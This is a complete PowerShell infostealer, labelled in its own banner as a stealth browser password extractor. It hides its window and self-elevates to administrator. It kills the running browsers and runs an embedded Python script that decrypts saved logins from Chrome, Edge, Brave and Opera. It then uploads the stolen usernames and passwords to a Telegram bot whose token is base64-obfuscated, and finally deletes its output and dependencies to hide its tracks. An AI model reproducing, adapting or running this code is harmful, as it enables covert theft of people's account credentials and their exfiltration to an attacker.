# ================= CONFIG =================
$DEBUG_MODE = $false  # Set to $true to show all output
$TELEGRAM_ENABLED = $true

$BotToken_B64 = "NzQ4MDQxODMzMzpBQUdVUnpCbUNMZ0JjYWVUaGl6WGZ1QXA1bUhrZERRMTBVTQ=="
$ChatID_B64 = "MTg0OTI2OTcwOA=="

$BotToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($BotToken_B64))
$ChatID = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ChatID_B64))

# ================= MINIMIZE WINDOW =================
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public static void Minimize() {
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, 6); // 6 = SW_MINIMIZE
    }
}
"@

if (-not $DEBUG_MODE) {
    [Window]::Minimize()
}

# ================= AUTO ELEVATE =================
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)

if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    if ($DEBUG_MODE) {
        Write-Host "[*] Elevating to Administrator..." -ForegroundColor Yellow
    }
    
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ================= LOG FUNCTION =================
function Write-Log {
    param([string]$Message, [string]$Color = "White")
    if ($DEBUG_MODE) {
        Write-Host $Message -ForegroundColor $Color
    }
}

# ================= BANNER =================
if ($DEBUG_MODE) {
    Write-Host ""
    Write-Host "===============================================" -ForegroundColor Cyan
    Write-Host "   BROWSER PASSWORD EXTRACTOR V7 (STEALTH)" -ForegroundColor Cyan
    Write-Host "===============================================" -ForegroundColor Cyan
    Write-Host ""
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ================= SETUP =================
$computer = $env:COMPUTERNAME
$dateTime = (Get-Date).ToString("yyyy-MM-dd_HH-mm-ss")
$scriptDir = Split-Path -Parent $PSCommandPath
$fileName = "$computer - passwords - $dateTime.txt"
$outFile = Join-Path $scriptDir $fileName

@"
=============================================
BROWSER PASSWORD EXTRACTION
=============================================
PC: $computer
Date: $dateTime
=============================================

"@ | Out-File $outFile -Encoding UTF8 -Force

Write-Log "[*] Output: $fileName" "Gray"
Write-Log ""

# ================= CLOSE BROWSERS =================
Write-Log "[*] Closing browsers..." "Yellow"

$procs = @("chrome", "msedge", "brave", "opera", "vivaldi", "firefox")
foreach ($p in $procs) {
    Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
}

Start-Sleep -Seconds 2
Write-Log "[+] Browsers closed" "Green"
Write-Log ""

# ================= CREATE PYTHON SCRIPT =================
$tempDir = "$env:TEMP\BrowserExtract_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

$pythonScript = @'
import os
import json
import base64
import sqlite3
import shutil
import sys

try:
    import win32crypt
except:
    import ctypes
    from ctypes import wintypes
    
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]
    
    def win32crypt_unprotect(encrypted_bytes):
        blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
        blob_out = DATA_BLOB()
        
        crypt32 = ctypes.windll.crypt32
        if crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return result
        return None

try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except:
    HAS_CRYPTO = False

def get_master_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        
        try:
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            master_key = win32crypt_unprotect(encrypted_key)
        
        return master_key
    except:
        return None

def decrypt_password(password_bytes, master_key):
    try:
        if password_bytes[:3] == b'v10' or password_bytes[:3] == b'v11':
            if not HAS_CRYPTO or not master_key:
                return None
            
            iv = password_bytes[3:15]
            encrypted_password = password_bytes[15:-16]
            
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_password)
            return decrypted.decode('utf-8')
        else:
            try:
                decrypted = win32crypt.CryptUnprotectData(password_bytes, None, None, None, 0)[1]
            except:
                decrypted = win32crypt_unprotect(password_bytes)
            
            return decrypted.decode('utf-8') if decrypted else None
    except:
        return None

def extract_passwords(browser_name, login_data_path, local_state_path):
    results = []
    
    if not os.path.exists(login_data_path):
        return results
    
    master_key = get_master_key(local_state_path) if os.path.exists(local_state_path) else None
    
    temp_db = os.path.join(os.environ['TEMP'], f'temp_db_{browser_name}.db')
    shutil.copy2(login_data_path, temp_db)
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            if username and encrypted_password:
                password = decrypt_password(encrypted_password, master_key)
                
                if password:
                    results.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })
        
        conn.close()
    except:
        pass
    
    try:
        os.remove(temp_db)
    except:
        pass
    
    return results

browsers = {
    'Chrome': {
        'login_data': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
    },
    'Edge': {
        'login_data': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State')
    },
    'Brave': {
        'login_data': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
        'local_state': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State')
    },
    'Opera': {
        'login_data': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data'),
        'local_state': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Local State')
    }
}

all_results = {}

for browser_name, paths in browsers.items():
    results = extract_passwords(browser_name, paths['login_data'], paths['local_state'])
    if results:
        all_results[browser_name] = results

print(json.dumps(all_results))
'@

$pythonScriptPath = Join-Path $tempDir "extract.py"
$pythonScript | Out-File $pythonScriptPath -Encoding UTF8 -Force

# ================= CHECK/INSTALL PYTHON =================
Write-Log "[*] Setting up Python..." "Yellow"

$pythonExe = $null
$pythonInstalled = $false

$pythonPaths = @(
    "python",
    "python3",
    "py",
    "$env:LOCALAPPDATA\Programs\Python\Python312\python.exe",
    "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
    "$env:LOCALAPPDATA\Programs\Python\Python310\python.exe",
    "C:\Python312\python.exe",
    "C:\Python311\python.exe",
    "C:\Python310\python.exe"
)

foreach ($path in $pythonPaths) {
    try {
        $null = & $path --version 2>&1
        $pythonExe = $path
        break
    }
    catch {}
}

if (-not $pythonExe) {
    Write-Log "[*] Installing Python..." "Yellow"
    
    try {
        $null = winget install Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements 2>&1
        Start-Sleep -Seconds 10
        
        $pythonExe = "$env:LOCALAPPDATA\Programs\Python\Python312\python.exe"
        if (Test-Path $pythonExe) {
            $pythonInstalled = $true
        }
        else {
            $pythonExe = "python"
        }
    }
    catch {
        Write-Log "[!] Python installation failed" "Red"
    }
}

if ($pythonExe) {
    Write-Log "[+] Python ready" "Green"
    
    # Install dependencies silently
    Write-Log "[*] Installing crypto libraries..." "Yellow"
    $null = & $pythonExe -m pip install --quiet --disable-pip-version-check pycryptodome pywin32 2>&1
    
    # Run extraction
    $jsonOutput = & $pythonExe $pythonScriptPath 2>&1
    
    try {
        $results = $jsonOutput | ConvertFrom-Json
        
        $totalFound = 0
        
        foreach ($browserName in $results.PSObject.Properties.Name) {
            $passwords = $results.$browserName
            
            if ($passwords.Count -gt 0) {
                Write-Log "[+] $browserName - Found $($passwords.Count) passwords" "Green"
                
                "`n========== $browserName ==========`n" | Out-File $outFile -Append -Encoding UTF8
                
                foreach ($entry in $passwords) {
                    $totalFound++
                    
                    Write-Log "  URL: $($entry.url)" "Cyan"
                    Write-Log "  User: $($entry.username)" "Yellow"
                    Write-Log "  Pass: $($entry.password)" "Green"
                    Write-Log ""
                    
                    "URL: $($entry.url)`nUsername: $($entry.username)`nPassword: $($entry.password)`n---`n" | Out-File $outFile -Append -Encoding UTF8
                }
            }
        }
        
        if ($totalFound -eq 0) {
            Write-Log "[-] No passwords found" "Yellow"
        }
        
        # ================= TELEGRAM SEND =================
        if ($TELEGRAM_ENABLED -and $totalFound -gt 0) {
            Write-Log ""
            Write-Log "[*] Sending to Telegram..." "Yellow"
            
            try {
                $url = "https://api.telegram.org/bot$BotToken/sendDocument"
                
                $boundary = [guid]::NewGuid().ToString()
                $LF = "`r`n"
                
                $fileBytes = [IO.File]::ReadAllBytes($outFile)
                $name = Split-Path $outFile -Leaf
                
                $bodyLines = @(
                    "--$boundary"
                    "Content-Disposition: form-data; name=`"chat_id`""
                    ""
                    $ChatID
                    "--$boundary"
                    "Content-Disposition: form-data; name=`"document`"; filename=`"$name`""
                    "Content-Type: text/plain"
                    ""
                )
                
                $bodyString = ($bodyLines -join $LF) + $LF
                $bodyBytes = [Text.Encoding]::UTF8.GetBytes($bodyString)
                $endBytes = [Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
                
                $payload = $bodyBytes + $fileBytes + $endBytes
                
                $wc = New-Object Net.WebClient
                $wc.Headers["Content-Type"] = "multipart/form-data; boundary=$boundary"
                $wc.UploadData($url, "POST", $payload) | Out-Null
                
                Write-Log "[+] Sent to Telegram!" "Green"
                
                # ================= AUTO-DESTRUCT OUTPUT FILE =================
                Start-Sleep -Milliseconds 500
                Remove-Item $outFile -Force -ErrorAction SilentlyContinue
                Write-Log "[+] Output file destroyed" "Green"
            }
            catch {
                Write-Log "[!] Telegram failed: $($_.Exception.Message)" "Red"
            }
        }
        
        Write-Log ""
        Write-Log "===============================================" "Cyan"
        Write-Log "   COMPLETE!" "Green"
        Write-Log "===============================================" "Cyan"
        Write-Log ""
        Write-Log "Total passwords: $totalFound" "Green"
        
        if ($TELEGRAM_ENABLED -and $totalFound -gt 0) {
            Write-Log "Status: Sent & Destroyed" "Green"
        }
    }
    catch {
        Write-Log "[!] Extraction failed: $($_.Exception.Message)" "Red"
    }
    
    # ================= UNINSTALL DEPENDENCIES =================
    Write-Log ""
    Write-Log "[*] Removing dependencies..." "Yellow"
    
    $null = & $pythonExe -m pip uninstall -y pycryptodome pywin32 2>&1
    
    Write-Log "[+] Dependencies removed" "Green"
    
    # ================= UNINSTALL PYTHON IF WE INSTALLED IT =================
    if ($pythonInstalled) {
        Write-Log "[*] Uninstalling Python..." "Yellow"
        
        try {
            $null = winget uninstall Python.Python.3.12 --silent 2>&1
            Write-Log "[+] Python uninstalled" "Green"
        }
        catch {
            Write-Log "[!] Could not uninstall Python automatically" "Yellow"
        }
    }
}

# ================= CLEANUP =================
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

if ($DEBUG_MODE) {
    Write-Host ""
    Write-Host "Press Enter to exit..."
    Read-Host
}
else {
    # Silent exit in stealth mode
    exit
}